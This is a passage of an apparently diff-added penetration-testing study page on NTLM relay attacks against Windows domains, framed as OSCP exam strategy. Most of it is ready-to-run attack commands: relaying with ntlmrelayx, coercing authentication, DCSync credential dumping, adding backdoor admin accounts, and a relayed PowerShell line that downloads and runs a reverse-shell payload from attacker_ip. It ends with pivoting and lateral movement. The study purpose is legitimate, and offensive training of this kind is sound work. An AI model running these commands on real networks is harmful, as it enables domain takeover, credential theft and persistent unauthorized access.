+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-smb2support
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1"># Relay and execute specific commands</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;net user hacker Passw0rd! /add &amp;&amp; net localgroup Administrators hacker /add&quot;</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="c1"># Relay and dump credentials</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>--dump-laps<span class="w"> </span>--dump-gmsa<span class="w"> </span>--dump-adcs
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="c1"># Relay with verbose output</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-debug
+</span></code></pre></div></p>
+<h4 id="step-4-trigger-authentication">Step 4: Trigger Authentication</h4>
+<p><strong>Wait for Natural Events:</strong>
+- User browsing to file shares
+- Scheduled tasks accessing network resources
+- Applications making network calls</p>
+<p><strong>Force Authentication:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Using PetitPotam (CVE-2021-36942)</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>attacker_ip<span class="w"> </span>target_ip
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># Using PrinterBug</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>python3<span class="w"> </span>printerbug.py<span class="w"> </span>domain/user:password@target<span class="w"> </span>attacker_ip
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># Using Coercer</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-d<span class="w"> </span>domain<span class="w"> </span>-t<span class="w"> </span>target<span class="w"> </span>-l<span class="w"> </span>attacker_ip
+</span></code></pre></div></p>
+<hr />
+<h3 id="method-2-ldapldaps-relay-dcsync-attack">Method 2: LDAP/LDAPS Relay (DCSync Attack)</h3>
+<h4 id="relay-to-ldap-for-acl-modifications">Relay to LDAP for ACL Modifications</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Relay to LDAP and add user to group</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://dc01.domain.local<span class="w"> </span>--escalate-user<span class="w"> </span>hacker
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># Relay to LDAPS (more reliable)</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span>--escalate-user<span class="w"> </span>hacker
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># Relay and perform DCSync</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span>--escalate-user<span class="w"> </span>hacker<span class="w"> </span>--dump
+</span></code></pre></div>
+<h4 id="after-escalation-perform-dcsync">After Escalation - Perform DCSync</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Using secretsdump</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/hacker:password@dc01.domain.local&#39;</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Dump all hashes</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/hacker:password@dc01.domain.local&#39;</span><span class="w"> </span>-just-dc
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c1"># Using mimikatz</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>lsadump::dcsync<span class="w"> </span>/domain:domain.local<span class="w"> </span>/user:krbtgt
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>lsadump::dcsync<span class="w"> </span>/domain:domain.local<span class="w"> </span>/all<span class="w"> </span>/csv
+</span></code></pre></div>
+<hr />
+<h3 id="method-3-mitm6-ntlmrelayx-ipv6-attack">Method 3: mitm6 + ntlmrelayx (IPv6 Attack)</h3>
+<h4 id="step-1-start-mitm6">Step 1: Start mitm6</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Basic mitm6 attack</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>sudo<span class="w"> </span>mitm6<span class="w"> </span>-d<span class="w"> </span>domain.local
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Target specific domain</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>sudo<span class="w"> </span>mitm6<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>--interface<span class="w"> </span>eth0
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c1"># With DNS blacklist</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>sudo<span class="w"> </span>mitm6<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>--ignore-nofqnd
+</span></code></pre></div>
+<h4 id="step-2-start-ntlmrelayx-with-wpad">Step 2: Start ntlmrelayx with WPAD</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Relay via WPAD</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span>-wh<span class="w"> </span>attacker-wpad
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># Relay and escalate</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span>-wh<span class="w"> </span>attacker-wpad<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="w">  </span>--escalate-user<span class="w"> </span>hacker<span class="w"> </span>--delegate-access
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="c1"># Relay with SOCKS</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span>-wh<span class="w"> </span>attacker-wpad<span class="w"> </span>-socks
+</span></code></pre></div>
+<hr />
+<h3 id="method-4-relay-to-specific-services">Method 4: Relay to Specific Services</h3>
+<h4 id="httpwebdav-relay">HTTP/WebDAV Relay</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Relay HTTP to SMB</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://192.168.1.100<span class="w"> </span>-smb2support
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Host malicious file</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;img src=&quot;file://attacker_ip/share&quot;&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>index.html
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div>
+<h4 id="mssql-relay">MSSQL Relay</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Relay to MSSQL</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>mssql://192.168.1.100<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;SELECT SYSTEM_USER&quot;</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># Enable xp_cmdshell and execute</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>mssql://192.168.1.100<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span>-q<span class="w"> </span><span class="s2">&quot;EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; EXEC xp_cmdshell &#39;whoami&#39;&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<h3 id="dump-credentials">Dump Credentials</h3>
+<p><strong>Local SAM Database:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@192.168.1.100&#39;</span>
+</span></code></pre></div></p>
+<p><strong>Active Directory (DCSync):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Dump specific user</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@dc01.domain.local&#39;</span><span class="w"> </span>-just-dc-user<span class="w"> </span>Administrator
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># Dump krbtgt (for Golden Ticket)</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@dc01.domain.local&#39;</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c1"># Dump everything</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@dc01.domain.local&#39;</span><span class="w"> </span>-just-dc
+</span></code></pre></div></p>
+<h3 id="create-backdoor-accounts">Create Backdoor Accounts</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Via ntlmrelayx</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;net user backdoor Passw0rd123! /add &amp;&amp; net localgroup Administrators backdoor /add&quot;</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1"># Via CrackMapExec (after getting creds)</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-x<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="w">  </span><span class="s2">&quot;net user backdoor Passw0rd123! /add &amp;&amp; net localgroup Administrators backdoor /add&quot;</span>
+</span></code></pre></div>
+<h3 id="establish-persistence">Establish Persistence</h3>
+<p><strong>Deploy Reverse Shell:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Generate payload</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span>attacker_ip<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>shell.exe
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c1"># Relay and execute</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;powershell -c IEX(New-Object Net.WebClient).DownloadFile(&#39;http://attacker_ip/shell.exe&#39;,&#39;C:\\Windows\\Temp\\shell.exe&#39;); C:\\Windows\\Temp\\shell.exe&quot;</span>
+</span></code></pre></div></p>
+<p><strong>WMI Persistence:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># Via impacket</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>wmiexec.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@192.168.1.100&#39;</span>
+</span></code></pre></div></p>
+<h3 id="pivot-through-network">Pivot Through Network</h3>
+<p><strong>Using SOCKS Proxy:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Start ntlmrelayx with SOCKS</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-socks
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="c1"># Configure proxychains (/etc/proxychains4.conf)</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="c1"># Add: socks4 127.0.0.1 1080</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="c1"># Use proxychains</span>
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>proxychains<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.2.0/24
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>proxychains<span class="w"> </span>secretsdump.py<span class="w"> </span>DOMAIN/user@192.168.2.100
+</span></code></pre></div></p>
+<hr />
+<h2 id="oscp-exam-strategy">OSCP Exam Strategy</h2>
+<h3 id="phase-1-reconnaissance-5-10-minutes">Phase 1: Reconnaissance (5-10 minutes)</h3>
+<ol>
+<li>
+<p><strong>Scan for SMB signing status:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.x.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>targets.txt
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Identify domain controllers:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>nmap<span class="w"> </span>-p389,636,88<span class="w"> </span><span class="m">192</span>.168.x.0/24
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Check network connectivity:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span>&lt;targets&gt;
+</span></code></pre></div></p>
+</li>
+</ol>
+<h3 id="phase-2-setup-2-5-minutes">Phase 2: Setup (2-5 minutes)</h3>
+<ol>
+<li>
+<p><strong>Configure Responder:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/responder/Responder.conf
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c1"># Set SMB = Off, HTTP = Off</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Start Responder:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-dwv
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Start ntlmrelayx in another terminal:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i
+</span></code></pre></div></p>
+</li>
+</ol>
+<h3 id="phase-3-wait-and-exploit-variable">Phase 3: Wait and Exploit (Variable)</h3>
+<ol>
+<li><strong>Monitor for incoming connections</strong></li>
+<li><strong>If you get a relay, note the connection details</strong></li>
+<li><strong>Connect to interactive shell if enabled:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>nc<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">11000</span>
+</span></code></pre></div></li>
+</ol>
+<h3 id="phase-4-post-exploitation-10-20-minutes">Phase 4: Post-Exploitation (10-20 minutes)</h3>
+<ol>
+<li>
+<p><strong>Dump credentials:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@target&#39;</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Check privilege level:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>target<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Execute commands or get shell:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>wmiexec.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@target&#39;</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>psexec.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@target&#39;</span>
+</span></code></pre></div></p>
+</li>
+</ol>
+<h3 id="phase-5-lateral-movement">Phase 5: Lateral Movement</h3>
+<ol>
+<li>
+<p><strong>Use obtained credentials:</strong>
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.x.0/24<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-H<span class="w"> </span>ntlmhash
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Continue pivoting until domain admin or full network compromise</strong></p>
+</li>
+</ol>
+<hr />
+<h2 id="troubleshooting">Troubleshooting</h2>
+<h3 id="common-issues">Common Issues</h3>
+<p><strong>1. "SMB Signing is required"</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Solution: Target doesn&#39;t support relay, try different targets
+</span></code></pre></div></p>
+<p><strong>2. "Access Denied"</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Solution: Relayed user doesn&#39;t have admin rights on target
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>Try different targets or wait for different user
+</span></code></pre></div></p>
+<p><strong>3. "Connection Timeout"</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>Solution: Check network connectivity and firewall rules
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>Verify targets are online: nmap -Pn -p445 &lt;target&gt;
+</span></code></pre></div></p>
+<p><strong>4. "Responder not capturing hashes"</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>Solution:
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>- Verify SMB/HTTP are OFF in Responder.conf
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>- Check interface: ip addr show
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>- Ensure you&#39;re on the correct network segment
+</span></code></pre></div></p>
+<p><strong>5. "ntlmrelayx not relaying"</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>Solution:
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>- Verify SMB2 support: --smb2support
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>- Check targets list is valid
